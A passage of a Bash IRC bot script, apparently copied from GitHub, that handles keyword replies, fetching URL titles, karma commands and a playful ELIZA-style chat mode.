      message_post $CHANNEL "I understand any of [ ${CHANNEL_COMMANDS[@]} ]"

    fi



    return

  fi



  if [ "${USE_KEYWORDS}" == "1" ]; then

      I=0

      for found in "${KEYWORDS[@]}"; do

        result=$(echo "$*" | $GREP_BIN -i "$found")

        if [ "${result}" ]; then

            RESPONSE="${KEYWORD_RESPONSES[${I}]}"

            SEDLINE="s/%SENDER%/${SENDER}/g"

            FORMATTED_RSP=$(echo "$RESPONSE" | $SED_BIN $SEDLINE)

  

            check_title=$(echo "$FORMATTED_RSP" | $GREP_BIN "%URL_TITLE%")

            if [ "$check_title" ]; then

               HTTP_TEXT=$(run_resolve "$*")

               TITLE=$(echo "${HTTP_TEXT}" | $GREP_BIN -o "<title>.*</title>" | $SED_BIN "s@<title>@@g" | $SED_BIN "s@</title>@@g" )

               debug "$SENDER asked for $TITLE from $*"

               if [ "$TITLE" ]; then

                  SEDLINE="s@%URL_TITLE%@$TITLE@g"

                  FORMATTED_RSP=$(echo "$FORMATTED_RSP" | $SED_BIN "${SEDLINE}")

               else

                  SEDLINE="s@%URL_TITLE%@(No Title)@g"

                  FORMATTED_RSP=$(echo "$FORMATTED_RSP" | $SED_BIN "${SEDLINE}")

               fi

            fi



            message_post $CHANNEL "${FORMATTED_RSP}"

            return

        fi

        (( I=$I+1 ))

      done

  fi



  KARMA_MODIFY=$(echo "$*" | egrep -o "([-a-zA-Z0-9_^@]+)\+=(\+|-|0x)?[0-9]+" | sed -e 's@+=@ += @')

  if [ "$KARMA_MODIFY" == "" ]; then

      KARMA_MODIFY=$(echo "$*" | egrep -o "([-a-zA-Z0-9_^@]+)-=(\+|-|0x)?[0-9]+" | sed -e 's@-=@ -= @')

  fi



  KARMA_PRE_INC=$(echo "$*" | egrep -o "\+\+([-a-zA-Z0-9_^@]+)" | tr -d '+')

  KARMA_POST_INC=$(echo "$*" | egrep -o "([-a-zA-Z0-9_^@]+)\+\+" | tr -d '+')



  KARMA_POST_DEC=$(echo "$*" | egrep -o "([-a-zA-Z0-9_^@]+)--" | tr -d '-')



  KARMA_QUERY=$(echo "$*" | egrep -o "([-a-zA-Z0-9_^@]+)==\?" | tr -d '=?')



  if [ "$KARMA_PRE_INC" != "" -o "$KARMA_POST_INC" != "" ]; then

      USER="${KARMA_PRE_INC}${KARMA_POST_INC}"

      if [ "$USER" != "$SENDER" ]; then

          karma_command "++" "$USER"

      else

          message_post $CHANNEL "Sorry, $SENDER but karma does not come from within"

      fi

  elif [ "$KARMA_POST_DEC" != "" ]; then

      USER="${KARMA_POST_DEC}"

      if [ "$USER" != "$SENDER" ]; then

          karma_command "--" "$USER"

      else

          message_post $CHANNEL "Sorry, $SENDER but karma does not come from within"

      fi

  elif [ "$KARMA_QUERY" != "" ]; then

      karma_command "get" "$KARMA_QUERY"

  elif [ "$KARMA_MODIFY" != "" ]; then

      USER=$(echo "$KARMA_MODIFY" | cut -d" " -f1)

      CMD=$(echo "$KARMA_MODIFY" | cut -d" " -f2)

      VAL=$(echo "$KARMA_MODIFY" | cut -d" " -f3)

      if [ "$USER" != "$SENDER" ]; then

          karma_command $CMD $USER $VAL

      else

          message_post $CHANNEL "Sorry, $SENDER but karma does not come from within"

      fi

  fi



  if [ "$DRBOT" == "on" ]; then

    SAID_COMMA_IRCBOT=$(echo "$*" | $GREP_BIN -o -i ,\ ircbot)

    if [ "$1" == ":${nick}" -o "$1" == ":$nick:" -o "$1" == ":$nick," -o "$SAID_COMMA_IRCBOT" ]; then

      shift

      INPUTLINE=$(echo "$*" | $TR_BIN "[a-z]" "[A-Z]" | $SED_BIN 's/^/ /; s/,/ /g; s/$/ /; s/\./ /g; s/ I / i /g; s/ I.M / i am /g; s/ YOU ARE/ you are/g; s/ AM / am /g; s/ ME / me /g; s/ YOU / you /g; s/ MY / my /g; s/ YOUR / your /g; s/ MINE / mine /g; s/ ARE / are /g; s/ me / YOU /g; s/ my / YOUR /g; s/ your / IRCBOTS /g; s/ i / YOU /g; s/ am / ARE /g;s/ mine / YOURS /g; s/ are / IS /; s/ you / IRCBOT /; s/^ //; s/ $//')

      #message_post $SENDER $INPUTLINE

      case "$INPUTLINE" in

        *YOU\ ARE\ *)

            INPUTLINE=$(echo "${INPUTLINE}?" | $SED_BIN 's/^.*YOU\ ARE/WHY DO YOU THINK YOU ARE/')

            ;;

        *YOU\ HAVE\ *)

            INPUTLINE=$(echo "${INPUTLINE}?" | $SED_BIN 's/^.*YOU\ HAVE/HOW LONG HAVE YOU HAD/')

            ;;

        YOU\ REALIZED*|WHEN\ *|*WHEN\ *|*YOU\ REALIZED*|*MOMENT\ AGO*|*MOMENT\ AGO)

            INPUTLINE=$(echo "${INPUTLINE}" | $SED_BIN 's/YOU REALIZED//g')

            INPUTLINE="interesting. did anything else happen ${INPUTLINE}?"

            ;;

        WHY\ DOES*|WHY\ DO*)

            INPUTLINE=$(echo "${INPUTLINE}?" | $SED_BIN 's/^WHY\ \(DO\|DOES\) //')

            INPUTLINE="why do you think that $INPUTLINE"

            ;;

        YOU*)

            INPUTLINE="when did you first realize that ${INPUTLINE}?"

            ;;

        *BECAUSE*)

            STATEMENT=$(echo "${INPUTLINE}?" | $SED_BIN 's/^.*BECAUSE //')

            INPUTLINE="are you sure ${STATEMENT}"

            ;;

        *DO\ IRCBOT\ THINK*)

            INPUTLINE="can't you answer that yourself?"

            ;;

        *IRCBOTS*)

            INPUTLINE="let's keep the conversation on something else please"

            ;;

        *TOUCHY*|*TESTY*|*ANGRY*|*MAD*|*HAPPY*|*SAD*|*EXCITED*)

            INPUTLINE="I have no emotions. That said, why have you interpreted my statement as such?"

            ;;

        *IRCBOT\ IS*|IRCBOT\ IS*)

            STATEMENT=$(echo "$INPUTLINE" | $SED_BIN 's/^.*IRCBOT IS //')

            INPUTLINE="I do not think I am $STATEMENT"

            ;;

        *ARE\ IRCBOT*|*IS\ IRCBOT*|ARE\ IRCBOT*|IS\ IRCBOT*)

            STATEMENT=$(echo "$INPUTLINE" | $SED_BIN "s/^.*\(ARE\|IS\) IRCBOT //")

            INPUTLINE="do you think I am ${STATEMENT}?"

            ;;

        *IS\ *\'S*|*DOES\ *\'S*|IS\ *\'S*|DOES\ *\'S*)

            PERSON=$(echo "$INPUTLINE" | $SED_BIN "s/^.*\(DOES\|IS\) \(.*'S\) \(.*\)/\2/" | $CUT_BIN -d"'" -f1)

            INPUTLINE="you should ask $PERSON"

            ;;

        IS\ AWESOME|IS\ GOOD|IS\ GREAT)

            INPUTLINE="thank you"

            ;;

        IS\ AWESOME\ AT*|IS\ GOOD\ AT*|IS\ GREAT\ AT*|IS\ *)

            INPUTLINE="i am not sure about that"

            ;;

        SUCKS\ AT*|STINKS\ AT*)

            INPUTLINE="i have no doubt this is correct"

            ;;

        IRCBOT\ SUCKS|IRCBOT\ SUCKS*|*IRCBOT\ SUCKS*|*IRCBOT\ SUCKS|SUCKS*)

            INPUTLINE="and you are a ray of sunshine?"

            ;;

        YES*)

            INPUTLINE="why do you think this is so?"

            ;;

        NO*)

            INPUTLINE="Why are you being negative?"

            ;;

          *)

            INPUTLINE="Why do you say ${INPUTLINE}?"

            ;;

      esac

      SEDLINE="s/ircbot/${nick}/g"

      INPUTLINE=$(echo "$INPUTLINE" | $TR_BIN "[A-Z]" "[a-z]" | $SED_BIN $SEDLINE | $SED_BIN 's/yourself/klarself/g' | $SED_BIN 's/myself/yourself/g' | $SED_BIN 's/klarself/yourself/g' )

      message_post $CHANNEL "$SENDER, $INPUTLINE"

    fi

  fi

}

© 2019 GitHub, Inc.
Terms
Privacy
Security
Status
Help

Contact GitHub
Pricing
API
Training
Blog
About

